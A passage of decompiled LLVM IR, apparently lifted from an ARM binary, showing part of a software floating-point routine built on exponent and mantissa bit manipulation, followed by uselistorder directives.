  %v5_15464 = udiv i32 %v0_154c0, 2
  %v6_15464 = or i32 %v1_15464, %v5_15464
  store i32 %v6_15464, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1549c57 = phi i32 [ %v1_1549c58, %.thread4 ], [ %v6_15464, %bb99 ]
  %v1_1544834 = phi i32 [ %v1_1544835, %.thread4 ], [ %v6_15464, %bb99 ]
  %v1_1546445 = phi i32 [ %v1_15464, %.thread4 ], [ %v6_15464, %bb99 ]
  %v1_15480 = phi i32 [ %v1_1548049, %.thread4 ], [ %v6_15464, %bb99 ]
  %v0_15474 = phi i32 [ %v0_15458, %.thread4 ], [ %v7_15458, %bb99 ]
  %v1_15478 = phi i32 [ %v1_1545c, %.thread4 ], [ %v3_1545c, %bb99 ]
  %v1_15468 = urem i32 %v3_1544c, 2
  %v2_15468 = icmp ne i32 %v1_15468, 0
  %v3_15468 = udiv i32 %v5_154b817, 4
  %v3_1546c = zext i1 %v2_15468 to i32
  %v6_1546c = and i64 %v14_15450, 4294967295
  %v7_1546c = sub i32 33, %v15_15450
  %v8_1546c = zext i32 %v7_1546c to i64
  %v9_1546c = shl i64 %v6_1546c, %v8_1546c
  %v10_1546c = sub i32 32, %v15_15450
  %v11_1546c = shl i32 %v3_1546c, %v10_1546c
  %v12_1546c = zext i32 %v11_1546c to i64
  %v14_1546c = or i64 %v12_1546c, %v9_1546c
  %v15_1546c = trunc i64 %v14_1546c to i32
  %v3_15470 = icmp uge i32 %v1_15478, %v15_1546c
  %v3_15474 = icmp eq i1 %v3_15470, false
  %v4_15474 = sub i32 %v0_15474, %v3_15468
  %v6_15474 = sext i1 %v3_15474 to i32
  %v7_15474 = add i32 %v6_15474, %v4_15474
  %v13_15474 = icmp ult i32 %v0_15474, %v3_15468
  %v14_15474 = or i1 %v13_15474, %v3_15474
  br i1 %v14_15474, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_15478 = sub i32 %v1_15478, %v15_1546c
  store i32 %v3_15478, i32* %r6.global-to-local, align 4
  store i32 %v7_15474, i32* %r5.global-to-local, align 4
  %v5_15480 = udiv i32 %v0_154c0, 4
  %v6_15480 = or i32 %v1_15480, %v5_15480
  store i32 %v6_15480, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1549c = phi i32 [ %v1_1549c57, %.thread6 ], [ %v6_15480, %bb100 ]
  %v1_1544833 = phi i32 [ %v1_1544834, %.thread6 ], [ %v6_15480, %bb100 ]
  %v1_1546444 = phi i32 [ %v1_1546445, %.thread6 ], [ %v6_15480, %bb100 ]
  %v1_1548053 = phi i32 [ %v1_15480, %.thread6 ], [ %v6_15480, %bb100 ]
  %v0_15490 = phi i32 [ %v0_15474, %.thread6 ], [ %v7_15474, %bb100 ]
  %v1_15494 = phi i32 [ %v1_15478, %.thread6 ], [ %v3_15478, %bb100 ]
  %v1_15484 = urem i32 %v3_15468, 2
  %v2_15484 = icmp ne i32 %v1_15484, 0
  %v3_15484 = udiv i32 %v5_154b817, 8
  %v3_15488 = zext i1 %v2_15484 to i32
  %v6_15488 = and i64 %v14_1546c, 4294967295
  %v7_15488 = sub i32 33, %v15_1546c
  %v8_15488 = zext i32 %v7_15488 to i64
  %v9_15488 = shl i64 %v6_15488, %v8_15488
  %v10_15488 = sub i32 32, %v15_1546c
  %v11_15488 = shl i32 %v3_15488, %v10_15488
  %v12_15488 = zext i32 %v11_15488 to i64
  %v14_15488 = or i64 %v12_15488, %v9_15488
  %v15_15488 = trunc i64 %v14_15488 to i32
  %v3_1548c = icmp uge i32 %v1_15494, %v15_15488
  %v3_15490 = icmp eq i1 %v3_1548c, false
  %v4_15490 = sub i32 %v0_15490, %v3_15484
  %v6_15490 = sext i1 %v3_15490 to i32
  %v7_15490 = add i32 %v6_15490, %v4_15490
  %v13_15490 = icmp ult i32 %v0_15490, %v3_15484
  %v14_15490 = or i1 %v13_15490, %v3_15490
  br i1 %v14_15490, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_15494 = sub i32 %v1_15494, %v15_15488
  store i32 %v3_15494, i32* %r6.global-to-local, align 4
  store i32 %v7_15490, i32* %r5.global-to-local, align 4
  %v5_1549c = udiv i32 %v0_154c0, 8
  %v6_1549c = or i32 %v1_1549c, %v5_1549c
  store i32 %v6_1549c, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_154ac = phi i32 [ %v1_15494, %.thread8 ], [ %v3_15494, %bb102 ]
  %v0_154a8 = phi i32 [ %v0_15490, %.thread8 ], [ %v7_15490, %bb102 ]
  %v2_154e4 = phi i32 [ %v1_1549c, %.thread8 ], [ %v6_1549c, %bb102 ]
  %v1_1544832 = phi i32 [ %v1_1544833, %.thread8 ], [ %v6_1549c, %bb102 ]
  %v1_1546443 = phi i32 [ %v1_1546444, %.thread8 ], [ %v6_1549c, %bb102 ]
  %v1_1548052 = phi i32 [ %v1_1548053, %.thread8 ], [ %v6_1549c, %bb102 ]
  %v2_154a0 = or i32 %v0_154a8, %v1_154ac
  %v4_154a0 = icmp eq i32 %v2_154a0, 0
  br i1 %v4_154a0, label %dec_label_pc_154e0, label %dec_label_pc_154a8

dec_label_pc_154a8:                               ; preds = %.thread10
  %v3_154a8 = mul i32 %v0_154a8, 16
  %v4_154ac = udiv i32 %v1_154ac, 268435456
  %v5_154ac = or i32 %v3_154a8, %v4_154ac
  store i32 %v5_154ac, i32* %r5.global-to-local, align 4
  %v3_154b0 = mul i32 %v1_154ac, 16
  store i32 %v3_154b0, i32* %r6.global-to-local, align 4
  %v3_154b4 = mul nuw i32 %v3_15484, 8
  %v4_154b8 = udiv i32 %v15_15488, 536870912
  %v5_154b8 = or i32 %v4_154b8, %v3_154b4
  %v3_154bc = mul i32 %v15_15488, 8
  %v3_154c0 = udiv i32 %v0_154c0, 16
  %tmp = icmp ult i32 %v0_154c0, 16
  br i1 %tmp, label %dec_label_pc_154c8, label %dec_label_pc_15438

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154a8
  %v1_154c8 = and i32 %v1_154e4.ph, 1048576
  %v2_154c8 = icmp eq i32 %v1_154c8, 0
  br i1 %v2_154c8, label %dec_label_pc_154d0, label %.thread11.loopexit

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c8
  %v2_154d0 = or i32 %v2_154e4, %v1_154e4.ph
  store i32 %v2_154d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15438.outer

dec_label_pc_154e0:                               ; preds = %.thread10
  store i32 %v15_15488, i32* %r3.global-to-local, align 4
  store i32 %v3_15484, i32* %r2.global-to-local, align 4
  %v1_154e0 = and i32 %v1_154e4.ph, 1048576
  %v2_154e0 = icmp eq i32 %v1_154e0, 0
  br i1 %v2_154e0, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_154e0
  %v3_154e4 = or i32 %v2_154e4, %v1_154e4.ph
  store i32 %v3_154e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_154c8
  store i32 %v3_154bc, i32* %r3.global-to-local, align 4
  store i32 %v5_154b8, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_154e0, %bb103
  %v1_154ec = add nsw i32 %v4_1540c, 515
  %v2_154ec = icmp ugt i32 %v1_15410, 252
  %v7_154ec = icmp eq i32 %v1_15410, 253
  %v2_154f0 = xor i1 %v7_154ec, true
  %v3_154f0 = and i1 %v2_154ec, %v2_154f0
  br i1 %v3_154f0, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_154f0 = icmp ugt i32 %v1_154ec, 1791
  %v11_154f0 = icmp eq i32 %v1_154ec, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_154f4 = phi i1 [ %v7_154ec, %.thread11 ], [ %v11_154f0, %bb104 ]
  %v0_154f4 = phi i1 [ %v2_154ec, %.thread11 ], [ %v6_154f0, %bb104 ]
  %v2_154f4 = xor i1 %v1_154f4, true
  %v3_154f4 = and i1 %v0_154f4, %v2_154f4
  call void @__pseudo_cond_branch(i1 %v3_154f4, i32 ptrtoint (i32* @global_var_15224.622 to i32))
  %v0_154f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_154f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_154f8 = sub i32 %v0_154f8, %v1_154f8
  store i32 %v2_154f8, i32* @ip, align 4
  %v3_154f8 = icmp uge i32 %v0_154f8, %v1_154f8
  %v9_154f8 = icmp eq i32 %v0_154f8, %v1_154f8
  br i1 %v9_154f8, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_154fc = load i32, i32* %r6.global-to-local, align 4
  %v2_154fc = load i32, i32* %r3.global-to-local, align 4
  %v3_154fc = sub i32 %v1_154fc, %v2_154fc
  store i32 %v3_154fc, i32* @ip, align 4
  %v4_154fc = icmp uge i32 %v1_154fc, %v2_154fc
  %v10_154fc = icmp eq i32 %v1_154fc, %v2_154fc
  br i1 %v10_154fc, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_15500 = load i32, i32* %r1.global-to-local, align 4
  %v2_15500 = urem i32 %v1_15500, 2
  %v3_15500 = icmp ne i32 %v2_15500, 0
  %v4_15500 = udiv i32 %v1_15500, 2
  store i32 %v4_15500, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_15504 = phi i1 [ %v3_154f8, %bb105 ], [ %v4_154fc, %bb106 ], [ %v3_15500, %bb107 ]
  %v0_15504 = load i32, i32* %r1.global-to-local, align 4
  %v2_15504 = zext i1 %v1_15504 to i32
  %v3_15504 = add i32 %v2_15504, %v0_15504
  store i32 %v3_15504, i32* @r1, align 4
  %v0_15508 = load i32, i32* %r0.global-to-local, align 4
  %v1_15508 = load i32, i32* %r4.global-to-local, align 4
  %v2_15508 = and i32 %v1_15508, 4096
  %v3_15508 = icmp ne i32 %v2_15508, 0
  %v4_15508 = mul i32 %v1_15508, 1048576
  %v6_15508 = add i32 %v4_15508, %v0_15508
  %v7_15508 = zext i1 %v3_15508 to i32
  %v8_15508 = add i32 %v7_15508, %v6_15508
  store i32 %v8_15508, i32* %r0.global-to-local, align 4
  %v2_1550c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1550c, i32* @r4, align 4
  store i32 %v6_153ac, i32* @r5, align 4
  store i32 %v9_153ac, i32* @r6, align 4
  ret i32 %v8_15508

dec_label_pc_15510:                               ; preds = %dec_label_pc_153cc
  %v1_15510 = and i32 %v2_153d0, -2147483648
  %v4_15514 = urem i32 %v1_153b8, 1048576
  %v5_15514 = or i32 %v1_15510, %v4_15514
  store i32 %v5_15514, i32* %r0.global-to-local, align 4
  %v6_15518 = add nsw i32 %v2_153cc, 1023
  store i32 %v6_15518, i32* %r4.global-to-local, align 4
  %v8_15518 = sub nsw i32 0, %v2_153cc
  %v9_15518 = and i32 %v6_15518, %v8_15518
  %v11_15518 = icmp slt i32 %v2_153cc, -1023
  %v12_15518 = icmp eq i32 %v6_15518, 0
  %v7_1551c = icmp sgt i32 %v2_153cc, -1023
  br i1 %v7_1551c, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_15510
  %v10_1551c = sub nsw i32 1024, %v2_153cc
  store i32 %v10_1551c, i32* %r5.global-to-local, align 4
  %v14_1551c = and i32 %v10_1551c, %v6_15518
  %v16_1551c = icmp slt i32 %v10_1551c, 0
  %v17_1551c = icmp eq i32 %v6_15518, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_15510, %bb108
  %v2_15524.in = phi i32 [ %v9_15518, %dec_label_pc_15510 ], [ %v14_1551c, %bb108 ]
  %v1_15524 = phi i1 [ %v11_15518, %dec_label_pc_15510 ], [ %v16_1551c, %bb108 ]
  %v0_15524 = phi i1 [ %v12_15518, %dec_label_pc_15510 ], [ %v17_1551c, %bb108 ]
  %v2_15524 = icmp slt i32 %v2_15524.in, 0
  %v3_15520 = xor i1 %v2_15524, %v1_15524
  %v4_15520 = or i1 %v0_15524, %v3_15520
  br i1 %v4_15520, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1552085 = mul i32 %v6_15518, 1048576
  %v10_1552086 = or i32 %v9_1552085, %v5_15514
  store i32 %v10_1552086, i32* %r0.global-to-local, align 4
  store i32 %v3_153ac, i32* @r4, align 4
  store i32 %v6_153ac, i32* @r5, align 4
  ret i32 %v10_1552086

bb111:                                            ; preds = %bb109
  %v1_15528 = or i32 %v5_15514, 1048576
  store i32 %v1_15528, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_15530 = add nsw i32 %v2_153cc, 1022
  store i32 %v1_15530, i32* @r4, align 4
  %v3_15530 = sub nsw i32 -1023, %v2_153cc
  %v4_15530 = and i32 %v6_15518, %v3_15530
  %v5_15530 = icmp slt i32 %v4_15530, 0
  store i1 %v5_15530, i1* @cpsr_v, align 1
  %v6_15530 = icmp slt i32 %v2_153cc, -1022
  store i1 %v6_15530, i1* @cpsr_n, align 1
  %v7_15530 = icmp eq i32 %v6_15518, 1
  store i1 %v7_15530, i1* @cpsr_z, align 1
  %v1_15534 = call i32 @function_15224(i32 %v1_15528)
  store i32 %v1_15534, i32* %r0.global-to-local, align 4
  %v0_15538 = load i32, i32* @r5, align 4
  %v1_15538 = load i32, i32* @r6, align 4
  %v2_15538 = or i32 %v1_15538, %v0_15538
  store i32 %v2_15538, i32* @lr, align 4
  %v1_1553c = call i32 @function_15224(i32 %v1_15534)
  store i32 %v1_1553c, i32* %r0.global-to-local, align 4
  %v0_15540.pre = load i32, i32* @ip, align 4
  %v0_15544.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15540

dec_label_pc_15540:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_15540.pre-phi = phi i32 [ %v5_153bc, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_153bc, %bb93 ], [ %v5_153bc, %bb111 ]
  %v0_15544 = phi i32 [ %v5_153b8, %.thread1 ], [ %v5_153b8, %.thread2 ], [ %v5_153b8, %bb93 ], [ %v0_15544.pre, %bb111 ]
  %v2_15548 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_15540.pre, %bb111 ]
  %v5_15540 = and i32 %v2_15548, %v4_15540.pre-phi
  store i32 %v5_15540, i32* @r5, align 4
  %v4_15544 = icmp eq i32 %v2_15548, %v0_15544
  br i1 %v4_15544, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_15540
  %v5_15548 = icmp eq i32 %v5_15540, %v2_15548
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_15540, %bb112
  %v0_1554c = phi i1 [ false, %dec_label_pc_15540 ], [ %v5_15548, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1554c, i32 ptrtoint (i32* @global_var_153a0.623 to i32))
  %v0_15550 = load i32, i32* @r4, align 4
  %v1_15550 = load i32, i32* @ip, align 4
  %v4_15550 = icmp eq i32 %v1_15550, %v0_15550
  br i1 %v4_15550, label %dec_label_pc_15558, label %dec_label_pc_15574

dec_label_pc_15558:                               ; preds = %bb113
  %v0_15558 = load i32, i32* @r1, align 4
  %v1_15558 = load i32, i32* %r0.global-to-local, align 4
  %v4_15558 = mul i32 %v1_15558, 4096
  %v5_15558 = or i32 %v4_15558, %v0_15558
  store i32 %v5_15558, i32* %r4.global-to-local, align 4
  %v1_1555c = icmp ne i32 %v5_15558, 0
  call void @__pseudo_cond_branch(i1 %v1_1555c, i32 ptrtoint (i32* @global_var_153a0.623 to i32))
  %v0_15560 = load i32, i32* @r5, align 4
  %v1_15560 = load i32, i32* @ip, align 4
  %v1_15564 = icmp ne i32 %v1_15560, %v0_15560
  call void @__pseudo_cond_branch(i1 %v1_15564, i32 ptrtoint (i32* @global_var_15388.624 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_15570 = call i32 @function_153a0(i32 %arg3, i32 %arg4)
  store i32 %v2_15570, i32* %r0.global-to-local, align 4
  %v1_15574.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15574

dec_label_pc_15574:                               ; preds = %bb113, %dec_label_pc_15558
  %v1_15574 = phi i32 [ %v1_15550, %bb113 ], [ %v1_15574.pre, %dec_label_pc_15558 ]
  %v0_15574 = load i32, i32* @r5, align 4
  %v4_15574 = icmp eq i32 %v0_15574, %v1_15574
  br i1 %v4_15574, label %dec_label_pc_1557c, label %dec_label_pc_15574.dec_label_pc_15590_crit_edge

dec_label_pc_15574.dec_label_pc_15590_crit_edge:  ; preds = %dec_label_pc_15574
  %v1_15590.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15590

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15574
  %v4_1557c = mul i32 %arg3, 4096
  %v5_1557c = or i32 %v4_1557c, %arg4
  store i32 %v5_1557c, i32* %r5.global-to-local, align 4
  %v7_1557c = icmp eq i32 %v5_1557c, 0
  call void @__pseudo_cond_branch(i1 %v7_1557c, i32 ptrtoint (i32* @global_var_1533c.625 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1558c = call i32 @function_153a0(i32 %arg3, i32 %arg4)
  store i32 %v2_1558c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %dec_label_pc_15574.dec_label_pc_15590_crit_edge, %dec_label_pc_1557c
  %v1_15590 = phi i32 [ %v1_15590.pre, %dec_label_pc_15574.dec_label_pc_15590_crit_edge ], [ %v2_1558c, %dec_label_pc_1557c ]
  %v0_15590 = load i32, i32* @r1, align 4
  %v3_15590 = mul i32 %v1_15590, 2
  %v4_15590 = or i32 %v3_15590, %v0_15590
  store i32 %v4_15590, i32* %r6.global-to-local, align 4
  %v6_15590 = icmp eq i32 %v4_15590, 0
  br i1 %v6_15590, label %dec_label_pc_15590._crit_edge, label %bb114

dec_label_pc_15590._crit_edge:                    ; preds = %dec_label_pc_15590
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_15590
  %v4_15594 = mul i32 %arg3, 2
  %v5_15594 = or i32 %v4_15594, %arg4
  store i32 %v5_15594, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_15594, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_15590._crit_edge, %bb114
  %v4_155a4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_15590._crit_edge ], [ %v5_15594, %bb114 ]
  %v0_15598 = phi i1 [ false, %dec_label_pc_15590._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_15598, i32 ptrtoint (i32* @global_var_152d4.626 to i32))
  %v0_1559c = load i32, i32* @r1, align 4
  %v1_1559c = load i32, i32* %r0.global-to-local, align 4
  %v3_1559c = mul i32 %v1_1559c, 2
  %v4_1559c = or i32 %v3_1559c, %v0_1559c
  store i32 %v4_1559c, i32* %r4.global-to-local, align 4
  %v1_155a0 = icmp ne i32 %v4_1559c, 0
  call void @__pseudo_cond_branch(i1 %v1_155a0, i32 ptrtoint (i32* @global_var_15388.624 to i32))
  store i32 %v4_155a4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_155a8 = icmp ne i32 %v4_155a4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_155a8, i32 ptrtoint (i32* @global_var_1533c.625 to i32))
  %v0_155ac = load i32, i32* %r0.global-to-local, align 4
  %v1_155ac = load i32, i32* @r1, align 4
  %v2_155ac = call i32 @function_153a0(i32 %v0_155ac, i32 %v1_155ac)
  store i32 %v2_155ac, i32* %r0.global-to-local, align 4
  ret i32 %v2_155ac

; uselistorder directives
  uselistorder i32 %v5_15594, { 1, 0, 2 }
  uselistorder i32 %v1_15550, { 1, 0 }
  uselistorder i32 %v10_1551c, { 2, 0, 1 }
  uselistorder i32 %v6_15518, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_15514, { 1, 0, 2 }
  uselistorder i32 %v2_154fc, { 1, 0, 2 }
  uselistorder i32 %v1_154fc, { 1, 0, 2 }
  uselistorder i32 %v1_154f8, { 1, 0, 2 }
  uselistorder i32 %v0_154f8, { 1, 0, 2 }
  uselistorder i1 %v7_154ec, { 1, 0 }
  uselistorder i32 %v2_154d0, { 1, 0 }
  uselistorder i32 %v3_154bc, { 2, 1, 0 }
  uselistorder i32 %v3_154b0, { 0, 2, 1 }
  uselistorder i32 %v5_154ac, { 2, 0, 1 }
  uselistorder i32 %v6_1549c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15488, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_15484, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15490, { 0, 2, 1 }
  uselistorder i32 %v1_1549c, { 1, 0 }
  uselistorder i32 %v6_15480, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1546c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_15468, { 0, 2, 1 }
  uselistorder i32 %v0_15474, { 0, 2, 1 }
  uselistorder i32 %v1_15480, { 1, 0 }
  uselistorder i32 %v6_15464, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15450, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15458, { 0, 2, 1 }
  uselistorder i32 %v1_15464, { 1, 0 }
  uselistorder i32 %v3_15448, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1543c, { 1, 2, 0 }
  uselistorder i32 %v3_154bc13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_154b817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1543c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15448, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_154e4.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_15428, { 1, 0 }
  uselistorder i32 %v0_1542c, { 1, 0 }
  uselistorder i32 %v3_15418, { 1, 0 }
  uselistorder i1 %v1_1540c, { 1, 0 }
  uselistorder i32 %v3_153fc, { 2, 3, 1, 0 }
  uselistorder i32 %v5_153f8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_153f0, { 2, 1, 0 }
  uselistorder i32 %v5_153ec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_153cc, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_153bc, { 2, 3, 1, 0 }
  uselistorder i32 %v5_153bc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_153b8, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_153b8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_153ac, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 2, 3, 4, 7, 1 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 5, 12, 10, 4, 13, 9, 11, 3, 14, 2, 15, 16, 19, 17, 18, 20, 21, 0, 1 }
  uselistorder i32 (i32, i32)* @function_153a0, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_15224, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 7, 8, 3, 9, 1, 10, 11, 12, 4, 6, 13, 5 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 4, 5, 6, 23, 30, 28, 29, 24, 3, 26, 21, 22, 1, 25, 2, 27 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 1, 4 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 27, 9, 10, 2, 11, 12, 13, 28, 14, 15, 3, 16, 17, 60, 61, 62, 0, 63, 64, 18, 19, 65, 66, 20, 67, 68, 102, 103, 83, 84, 69, 70, 35, 36, 37, 113, 38, 114, 115, 39, 116, 117, 40, 118, 119, 120, 121, 122, 123, 104, 105, 106, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 107, 41, 95, 51, 55, 71, 72, 32, 49, 21, 58, 59, 30, 124, 31, 73, 74, 75, 76, 77, 108, 109, 78, 79, 80, 96, 97, 98, 99, 100, 101, 50, 110, 111, 52, 112, 29, 22, 23, 24, 25, 26, 45, 53, 54, 42, 43, 44, 56, 57, 33, 81, 46, 82, 34, 47, 48 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 56, 55, 31, 9, 10, 22, 11, 54, 32, 12, 13, 23, 14, 71, 72, 73, 74, 0, 1, 75, 76, 77, 78, 79, 15, 80, 59, 47, 48, 57, 119, 120, 121, 122, 28, 123, 86, 81, 147, 38, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 39, 124, 87, 88, 89, 90, 91, 92, 93, 94, 95, 16, 40, 96, 37, 97, 98, 58, 99, 100, 101, 125, 126, 127, 164, 60, 17, 64, 146, 131, 130, 128, 129, 132, 133, 134, 135, 136, 137, 18, 82, 83, 2, 69, 70, 33, 163, 43, 44, 41, 42, 24, 25, 35, 36, 45, 165, 102, 84, 138, 139, 103, 104, 53, 105, 106, 107, 108, 29, 109, 49, 50, 110, 111, 112, 46, 113, 114, 115, 116, 34, 26, 27, 117, 118, 51, 140, 141, 61, 142, 143, 30, 144, 145, 62, 63, 19, 20, 52, 21, 65, 66, 67, 68, 85 }
  uselistorder i32 4, { 7, 8, 134, 204, 205, 133, 9, 10, 206, 207, 132, 11, 12, 168, 13, 92, 93, 94, 169, 170, 171, 172, 173, 174, 175, 0, 14, 59, 176, 177, 178, 179, 180, 181, 182, 57, 183, 95, 96, 97, 184, 185, 84, 186, 73, 187, 15, 16, 1, 140, 208, 209, 210, 211, 212, 248, 249, 250, 98, 99, 100, 85, 101, 102, 103, 104, 105, 106, 188, 107, 108, 189, 190, 86, 109, 17, 213, 18, 83, 74, 75, 19, 279, 76, 61, 20, 21, 77, 78, 280, 281, 282, 283, 79, 284, 285, 286, 287, 80, 288, 289, 290, 291, 292, 22, 293, 294, 295, 296, 297, 81, 60, 298, 299, 300, 301, 302, 303, 23, 24, 82, 251, 252, 87, 214, 215, 216, 217, 88, 218, 219, 220, 221, 222, 65, 58, 223, 224, 225, 226, 227, 253, 228, 304, 305, 306, 308, 309, 110, 111, 112, 142, 143, 144, 145, 25, 137, 113, 138, 114, 66, 139, 152, 115, 153, 154, 2, 275, 276, 277, 278, 67, 116, 117, 256, 258, 257, 254, 255, 259, 260, 261, 262, 263, 264, 265, 266, 267, 191, 192, 193, 194, 195, 196, 3, 26, 197, 160, 307, 229, 27, 28, 29, 30, 4, 31, 62, 63, 32, 5, 70, 6, 33, 118, 53, 34, 35, 198, 146, 119, 36, 120, 121, 122, 123, 124, 230, 37, 231, 125, 232, 233, 234, 235, 236, 237, 238, 126, 239, 240, 241, 242, 243, 244, 54, 247, 127, 128, 246, 135, 245, 268, 269, 89, 270, 271, 147, 148, 149, 64, 68, 150, 151, 272, 273, 38, 39, 71, 40, 41, 72, 69, 42, 43, 141, 44, 45, 46, 47, 48, 129, 49, 130, 155, 156, 55, 157, 158, 159, 161, 162, 163, 164, 165, 166, 167, 199, 90, 200, 201, 202, 131, 50, 274, 56, 51, 203, 52, 136, 91 }
  uselistorder i32 32, { 48, 49, 50, 51, 21, 22, 29, 35, 36, 24, 25, 52, 23, 30, 53, 54, 55, 56, 28, 57, 41, 42, 43, 0, 44, 45, 37, 4, 3, 6, 5, 8, 7, 46, 47, 31, 32, 26, 58, 33, 17, 59, 60, 40, 1, 15, 27, 69, 70, 71, 61, 16, 62, 2, 34, 63, 64, 65, 66, 67, 18, 68, 38, 39, 72, 73, 74, 75, 10, 9, 12, 11, 19, 20, 14, 13 }
  uselistorder i32 33, { 2, 3, 4, 0, 5, 6, 1 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 50, 49, 32, 31, 33, 34, 35, 36, 39, 37, 40, 38, 42, 41, 44, 43, 46, 45, 48, 47 }
